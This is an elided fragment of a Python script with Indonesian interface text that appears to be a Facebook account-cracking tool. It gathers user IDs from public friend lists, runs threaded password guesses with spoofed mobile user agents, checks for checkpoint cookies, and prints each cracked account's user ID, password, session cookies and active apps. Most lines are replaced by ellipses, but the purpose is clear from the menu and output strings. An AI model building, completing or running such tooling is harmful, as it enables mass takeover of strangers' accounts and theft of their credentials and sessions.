...
for xd in range(10000):
	...
	c='en-US; SM-J730G Build/PPR1.180610.011)'
...
def login_lagi334():
	try:
		...
		print('\n LOGIN BERHASIL  --->jalankan ulang ketik python run.py ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	io = '''[bold red][01] CRACK DARI PERTEMANAN PUBLIK'''
	oi = nel(io, style='red')
...
def dump_publik():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] PERTEMANAN HARUS PUBLIK')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	tanya = '# INGIN MENAMPILKAN OPSI CHECKPOINT ? (y/t)'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					infoakun += (f"\n[bold green][•] APLIKASI AKTIF :[/bold green] \n")
					...
					hit=0
					infoakun += (f"\n[bold red][•] APLIKASI KADALUARSA :[/bold red]\n")
					...
					print('\n')
					statusok = f'[bold red][•] USER ID   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] UGENT : {ua}[/bold cyan]\n{infoakun}'
